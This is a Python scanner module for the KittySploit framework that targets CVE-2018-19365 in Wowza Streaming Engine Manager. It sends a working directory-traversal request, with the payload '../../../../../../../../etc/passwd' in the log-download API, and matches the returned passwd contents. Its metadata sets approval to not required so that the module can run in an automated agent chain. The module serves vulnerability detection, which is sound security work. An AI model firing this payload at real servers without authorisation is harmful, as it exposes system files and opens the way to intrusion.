#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Wowza Streaming Engine 4."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Wowza Streaming Engine Manager 4.7.4.01 - Directory Traversal Detection',
        'description': 'Wowza Streaming Engine 4.7.4.01 allows traversal of the directory structure and retrieval of a file via a remote, specifically crafted HTTP request to the REST API.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'wowza', 'lfi', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://blog.gdssecurity.com/labs/2019/2/11/wowza-streaming-engine-manager-directory-traversal-and-local.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-19365',
            'https://raw.githubusercontent.com/WowzaMediaSystems/public_cve/main/wowza-streaming-engine/CVE-2018-19365.txt',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2018-19365',
    }

    def run(self):
        r = self.http_request(method="GET", path='/enginemanager/server/logs/download?logType=error&logName=../../../../../../../../etc/passwd&logSource=engine', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        server = r.headers.get("Server") or r.headers.get("server") or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='critical',
                reason="Wowza Streaming Engine Manager 4.7.4.01 - Directory Traversal detected",
                path='/enginemanager/server/logs/download?logType=error&logName=../../../../../../../../etc/passwd&logSource=engine',
            )
            return True
        return False

